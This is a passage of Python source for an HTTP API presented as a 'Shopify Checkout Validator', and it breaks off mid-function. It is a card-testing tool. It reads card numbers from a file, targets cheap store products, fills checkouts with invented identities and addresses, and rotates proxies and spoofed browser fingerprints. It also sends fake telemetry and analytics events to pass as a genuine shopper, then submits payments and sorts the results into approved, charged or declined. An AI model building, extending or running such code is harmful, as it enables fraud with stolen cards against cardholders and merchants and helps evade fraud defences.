"""
Shopify Checkout Validator API — VPS Edition
High-performance, fully async, production-ready.

Endpoints:
  GET /shopify?site={site}&cc={card}&proxy={proxy}
  GET /check?site={site}&card={card}&proxy={proxy}
  GET /health

Card formats:  cc|mm|yy|cvv  or  cc|mm|yyyy|cvv
Proxy formats: ip:port  |  ip:port:user:pass  |  host:port:user:pass  |  scheme://...

Environment variables (all optional):
  PORT              Server port (default 8080)
  WORKERS           uvicorn worker count (default 14)
  CARDS_FILE        Path to cards.txt (default ./cards.txt)
  MAX_PRICE         Max product price to target (default 8.0)
  SITE_CONCURRENCY  Max simultaneous requests per store (default 15)
  POOL_SIZE         aiohttp global connection pool (default 500)
  POOL_PER_HOST     aiohttp per-host connection limit (default 25)
  CONNECT_TIMEOUT   TCP connect timeout seconds (default 8)
  REQUEST_TIMEOUT   Full request timeout seconds (default 35)
  CACHE_TTL         Product cache TTL seconds (default 300)
  LOG_LEVEL         Logging level: debug|info|warning (default warning)
"""

import asyncio
import copy
import uuid

import logging
import os
import random
import re
import time
from collections import defaultdict
from contextlib import asynccontextmanager
from typing import Any, Optional
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession, RequestsError
import orjson
import uvicorn
from fastapi import FastAPI, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse

# ---------------------------------------------------------------------------
# Configuration from environment
# ---------------------------------------------------------------------------
PORT             = int(os.environ.get("PORT", 8080))
WORKERS          = int(os.environ.get("WORKERS", 14))
CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
MAX_PRICE        = float(os.environ.get("MAX_PRICE", 8.0))
SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 15))
POOL_SIZE        = int(os.environ.get("POOL_SIZE", 500))
POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 25))
CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))
REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 35))
CACHE_TTL        = float(os.environ.get("CACHE_TTL", 300))
LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify")

# ---------------------------------------------------------------------------
# GraphQL Queries
# ---------------------------------------------------------------------------
# Variable declarations shared by both proposal queries
_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)

# PurchaseProposal arguments shared by both proposal queries
_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)

# SellerProposal fragment (shared by shipping & delivery queries)
_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}"
    "__typename}"
)

QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)

# Receipt fragment shared by delivery proposal and submit mutation
_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename} __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}"
    "__typename}__typename}__typename}"
)

QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ---------------------------------------------------------------------------
# Static data
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

ADDRESS_BOOK: dict[str, dict] = {
    "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
    "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London",      "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road",      "city": "Mumbai",      "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa Tower","city": "Dubai",       "postalCode": "00000",   "zoneCode": "DU",  "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "88 Nathan Road",    "city": "Kowloon",     "postalCode": "000000",  "zoneCode": "KLN", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Gotthardstrasse 17","city": "Schwyz",      "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",   "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",   "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",    "zoneCode": "AUK", "countryCode": "NZ", "phone": "98765432"},
    "SG": {"address1": "1 Raffles Place",   "city": "Singapore",   "postalCode": "048616",  "zoneCode": "01",  "countryCode": "SG", "phone": "61234567"},
    "JP": {"address1": "1-1 Marunouchi",    "city": "Tokyo",       "postalCode": "100-0005","zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
    "BR": {"address1": "Av. Paulista 1000", "city": "Sao Paulo",   "postalCode": "01310-100","zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
    "MX": {"address1": "Paseo de la Reforma 1","city": "Mexico City","postalCode": "06600", "zoneCode": "CMX","countryCode": "MX", "phone": "5512345678"},
    "SE": {"address1": "Drottninggatan 1",  "city": "Stockholm",   "postalCode": "11151",   "zoneCode": "AB",  "countryCode": "SE", "phone": "812345678"},
    "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
}

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas",
               "Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen",
               "Emily","Ashley","Daniel","Matthew","Andrew","Joshua","Christopher","Ryan","Tyler"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
               "Martinez","Hernandez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Lee",
               "White","Harris","Martin","Thompson","Turner","Mitchell","Campbell","Roberts","Evans"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
                 "live.com","mail.com","aol.com"]

# ---------------------------------------------------------------------------
# HIGH-QUALITY USER AGENTS - Latest versions (May 2025)
# Updated to Chrome 136 - realistic browser fingerprints
# ---------------------------------------------------------------------------
USER_AGENTS = [
    # Windows Chrome 136 (most common)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6778.139 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    # Windows Edge 136
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
    # macOS Chrome 136
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    # macOS Safari 17.5
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    # Linux Chrome 136
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    # Windows Firefox 127
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    # macOS Firefox 127  
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0",
]


def _client_hints_for_ua(ua: str) -> dict:
    """Generate sec-ch-ua / mobile / platform hints that match the UA."""
    is_mac     = "Macintosh" in ua or "Mac OS X" in ua
    is_linux   = "Linux" in ua and "Android" not in ua
    is_firefox = "Firefox/" in ua and "Chrome/" not in ua
    is_safari  = "Safari/" in ua and "Chrome/" not in ua and not is_firefox
    is_edge    = "Edg/" in ua
    
    if is_firefox or is_safari:
        # Firefox and Safari don't send sec-ch-ua hints
        return {}
    
    # Extract Chrome major version
    m = re.search(r"Chrome/(\d+)", ua)
    chrome_v = m.group(1) if m else "136"
    
    platform = '"macOS"' if is_mac else ('"Linux"' if is_linux else '"Windows"')
    
    # Build realistic sec-ch-ua based on browser type
    if is_edge:
        sec_ch_ua = f'"Microsoft Edge";v="{chrome_v}", "Chromium";v="{chrome_v}", "Not-A.Brand";v="24"'
    else:
        sec_ch_ua = f'"Chromium";v="{chrome_v}", "Google Chrome";v="{chrome_v}", "Not-A.Brand";v="24"'
    
    return {
        "sec-ch-ua":          sec_ch_ua,
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": platform,
    }

# ---------------------------------------------------------------------------
# Global process-level state
# ---------------------------------------------------------------------------
_shared_session: Optional[AsyncSession] = None
_site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
    lambda: asyncio.Semaphore(SITE_CONCURRENCY)
)

# Product cache: hostname -> {"product": dict|None, "candidates": list, "err": str, "ts": float}
_product_cache: dict[str, dict] = {}

# Cards loaded from file
_cards_cache: list[dict] = []
_cards_loaded_at: float  = 0.0


# ---------------------------------------------------------------------------
# App lifecycle
# ---------------------------------------------------------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    global _shared_session
    _shared_session = AsyncSession(impersonate="chrome136", timeout=REQUEST_TIMEOUT)
    _reload_cards()
    log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site", POOL_SIZE, SITE_CONCURRENCY)
    yield
    if _shared_session:
        res = _shared_session.close()
        if asyncio.iscoroutine(res):
            await res


app = FastAPI(title="Shopify Validator", version="4.0.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Request statistics
_stats: dict[str, int] = defaultdict(int)


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache  = _load_cards_from_file()
    _cards_loaded_at = time.time()


def _load_cards_from_file() -> list[dict]:
    cards = []
    if not os.path.exists(CARDS_FILE):
        return cards
    with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            card = _parse_card(line.strip())
            if card:
                cards.append(card)
    return cards


def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache


def _parse_card(raw: str) -> Optional[dict]:
    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv.  Returns normalized dict or None."""
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    if len(cc_num) < 13 or len(cc_num) > 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}


def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if "://" in s:
        return s
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


_TLD_TO_CC = {
    "us": "US", "ca": "CA", "uk": "GB", "gb": "GB",
    "in": "IN", "ae": "AE", "hk": "HK", "ch": "CH",
    "au": "AU", "de": "DE", "fr": "FR", "nz": "NZ",
    "sg": "SG", "jp": "JP", "br": "BR", "mx": "MX",
    "se": "SE",
}


def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    """Choose a billing/shipping address.
    1. Currency-based lookup (most reliable) once we know the store currency.
    2. Country-code TLD (e.g. .co.uk → GB, .ca → CA).
    3. Default (US).
    """
    # Currency takes priority — once we've parsed the checkout page we know
    # the store's actual settlement currency, which is far more reliable
    # than guessing from the TLD.
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in ADDRESS_BOOK:
            return ADDRESS_BOOK[cc]

    netloc = urlparse(url).netloc.split(":")[0].lower()
    parts  = netloc.split(".")
    # Try last two parts first (handles .co.uk, .com.au, .com.br, etc.)
    if len(parts) >= 2:
        last_two = parts[-2] + "." + parts[-1]
        if last_two in ("co.uk", "org.uk"):
            return ADDRESS_BOOK["GB"]
        if last_two == "com.au":
            return ADDRESS_BOOK["AU"]
        if last_two == "com.br":
            return ADDRESS_BOOK["BR"]
        if last_two == "com.mx":
            return ADDRESS_BOOK["MX"]
        if last_two == "co.nz":
            return ADDRESS_BOOK["NZ"]
        if last_two == "co.jp":
            return ADDRESS_BOOK["JP"]
    tld = parts[-1] if parts else ""
    cc  = _TLD_TO_CC.get(tld)
    if cc and cc in ADDRESS_BOOK:
        return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]


def _random_identity() -> tuple[str, str, str]:
    first = random.choice(FIRST_NAMES)
    last  = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


def _extract(text: str, start: str, end: str) -> Optional[str]:
    """Fast substring extraction between two delimiters."""
    idx = text.find(start)
    if idx == -1:
        return None
    sub     = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
    return val if val else None


def _extract_sst(text: str, headers: dict) -> Optional[str]:
    """Try every known pattern to pull the Shopify checkout session token."""
    # From response header (fastest)
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    # From HTML / JSON embedded in page
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"',   '"'),
        ('"sessionToken":"',             '"'),
        ("sessionToken&quot;:&quot;",   "&quot;"),
        ('data-session-token="',         '"'),
        ('"checkout_session_token":"',   '"'),
    ]
    for s, e in patterns:
        val = _extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None


def _normalize_response(raw: Optional[str]) -> str:
    """Map raw Shopify / aiohttp error text to a standard code."""
    if not raw:
        return "CARD_DECLINED"
    msg = str(raw).upper()

    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED")):
        return "ORDER_PLACED"
    if any(k in msg for k in ("CHARGED", "PAYMENT_CHARGED", "CHARGE_SUCCESS")):
        return "CHARGED"
    if any(k in msg for k in ("APPROVED", "PAYMENT_APPROVED", "CARD_APPROVED")):
        return "APPROVED"

    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
                               "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
                               "AUTHENTICATION_REQUIRED", "THREEDSSECURE",
                               "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED")):
        return "3DS_REQUIRED"
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
                               "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
                               "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT FUND",
                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE",
                               "EXCEEDS BALANCE")):
        return "INSUFFICIENT_FUNDS"
    # Tightened: avoid matching the bare word "EXPIRY" which can appear in
    # unrelated phrases like "session expiry"
    if any(k in msg for k in ("EXPIRED_CARD", "CARD_EXPIRED", "INVALID_EXPIRY",
                               "EXPIRY_CHECK", "EXPIRATION_DATE",
                               "EXPIRED CARD", "CARD HAS EXPIRED")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                               "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
                               "CARD_NOT_SUPPORTED")):
        return "INVALID_CARD"
    if any(k in msg for k in ("LOST_CARD", "STOLEN_CARD", "PICKUP_CARD",
                               "RESTRICTED_CARD", "REVOCATION")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
                               "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
                               "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
        return "CARD_DECLINED"
    return "CARD_DECLINED"


def _parse_gql_errors(errors: list) -> tuple[str, str]:
    """
    Try to extract a meaningful response code from a GraphQL errors list.
    Returns (code, detail) tuple. detail contains the raw error messages
    for debugging when code is GRAPHQL_ERROR.
    """
    raw_messages = []
    for err in errors:
        msg = str(err.get("message") or "")
        if msg:
            raw_messages.append(msg)
        for field in ("code", "nonLocalizedMessage", "localizedMessage",
                      "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(field) or "")
            if not raw:
                continue
            norm = _normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm, raw
            upper = raw.upper()
            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                         "CHARGE_DECLINED", "CARD_WAS_DECLINED",
                                         "FRAUD")):
                return "CARD_DECLINED", raw
            if any(k in upper for k in ("CHECKOUT_ALREADY_COMPLETED", "ALREADY_ACCEPTED")):
                return "CARD_DECLINED", raw
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                                         "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED", raw
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
                                         "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN", raw
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
                                         "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT", raw
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
                                         "RATE_LIMITED", "RETRY_LATER")):
                return "THROTTLED", raw
    detail = "; ".join(raw_messages[:3]) if raw_messages else "unknown error"
    return "GRAPHQL_ERROR", detail


def _is_schema_error(errors: list) -> bool:
    """Detect GraphQL schema/validation errors that won't resolve on retry."""
    for err in errors:
        msg = str(err.get("message") or "").lower()
        ext = err.get("extensions") or {}
        code = str(ext.get("code") or "").lower()
        if code in ("undefinedfield", "variablecoercionfailed", "unknowntype",
                     "argumentliteralsinconsistenttype", "fieldsconflict",
                     "variablenotdefined", "missingrequiredargument"):
            return True
        if any(k in msg for k in ("unknown type", "unknown field", "is not defined",
                                   "expected type", "was provided invalid value",
                                   "field is not defined", "argument is not accepted",
                                   "parse error", "syntax error")):
            return True
    return False


def _make_session(proxy_str: Optional[str], ua: Optional[str] = None) -> tuple[AsyncSession, bool]:
    proxy = _parse_proxy(proxy_str) if proxy_str else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    # Use latest Chrome impersonation by default
    imp = "chrome136"
    if ua:
        ua_lower = ua.lower()
        if "firefox" in ua_lower and "chrome" not in ua_lower:
            imp = "firefox"
        elif "safari" in ua_lower and "chrome" not in ua_lower and "firefox" not in ua_lower:
            imp = "safari17_0"
        elif "edg/" in ua_lower:
            imp = "edge136"
        elif "chrome/136" in ua_lower:
            imp = "chrome136"
        elif "chrome/135" in ua_lower:
            imp = "chrome135"
        elif "chrome" in ua_lower:
            imp = "chrome136"
            
    session = AsyncSession(impersonate=imp, timeout=REQUEST_TIMEOUT, proxies=proxies)
    return session, True


async def _send_telemetry(
    session: AsyncSession,
    metric_name: str,
    metric_type: str,
    value: Any,
    ua: str,
    client_hints: dict,
    origin: str = "https://checkout.pci.shopifyinc.com",
) -> None:
    url = "https://us-central1-shopify-instrumentat-ff788286.cloudfunctions.net/telemetry"
    headers = {
        'accept':             '*/*',
        'accept-language':    'en-US,en;q=0.9',
        'content-type':       'application/json',
        'origin':             origin,
        'referer':            f"{origin}/",
        'sec-ch-ua':          client_hints.get('sec-ch-ua', ''),
        'sec-ch-ua-mobile':   '?0',
        'sec-ch-ua-platform': client_hints.get('sec-ch-ua-platform', ''),
        'sec-fetch-dest':     'empty',
        'sec-fetch-mode':     'cors',
        'sec-fetch-site':     'cross-site',
        'user-agent':         ua,
        'priority':           'u=1, i'
    }
    tags = {}
    if metric_name == "HostedFields_CardFields_deposit_time":
        tags = {"retries": 10, "status": 200, "cardsinkUrl": "/sessions"}
    body = {
        "service": "hosted-fields",
        "metrics": [{"type": metric_type, "value": value, "name": metric_name, "tags": tags}]
    }
    try:
        await session.post(url, json=body, headers=headers, timeout=5)
    except Exception:
        pass


async def _monorail_produce(
    session: AsyncSession,
    base_url: str,
    shop_id: int,
    visit_token: str,
    client_id: str,
    ua: str,
    client_hints: dict,
) -> None:
    url = f"{base_url}/.well-known/shopify/monorail/v1/produce"
    headers = {
        'content-type':       'text/plain',
        'origin':             base_url,
        'priority':           'u=4, i',
        'sec-fetch-mode':     'no-cors',
        'user-agent':         ua,
        **client_hints
    }
    payload = {
        "schema_id": "perf_kit_on_interaction/3.2",
        "payload": {
            "url": f"{base_url}/collections/all",
            "page_type": "product",
            "shop_id": shop_id,
            "application": "storefront-renderer",
            "session_token": visit_token,
            "unique_token": client_id,
            "micro_session_id": str(uuid.uuid4()).upper(),
            "micro_session_count": 1,
            "interaction_to_next_paint": random.randint(30, 80),
            "seo_bot": False,
            "referrer": base_url,
            "worker_start": 0,
            "next_hop_protocol": "h3"
        },
        "metadata": {
            "event_created_at_ms": int(time.time() * 1000),
            "event_sent_at_ms": int(time.time() * 1000)
        }
    }
    try:
        await session.post(url, data=orjson.dumps(payload), headers=headers, timeout=5)
    except Exception:
        pass


async def _monorail_produce_batch(
    session: AsyncSession,
    base_url: str,
    checkout_url: Optional[str],
    shop_id: int,
    visit_token: str,
    client_id: str,
    ua: str,
    client_hints: dict,
    event_name: str = "product_added_to_cart",
    schema_version: str = "4.27",
) -> None:
    url = f"{base_url}/.well-known/shopify/monorail/unstable/produce_batch"
    headers = {
        'content-type':       'text/plain;charset=UTF-8',
        'origin':             base_url,
        'priority':           'u=4, i',
        'sec-fetch-mode':     'no-cors',
        'user-agent':         ua,
        **client_hints
    }
    now_ms   = int(time.time() * 1000)
    event_id = f"sh-{str(uuid.uuid4()).upper()[:23]}"
    events   = [{
        "schema_id": f"storefront_customer_tracking/{schema_version}",
        "payload": {
            "api_client_id": 580111, "event_id": event_id, "event_name": event_name,
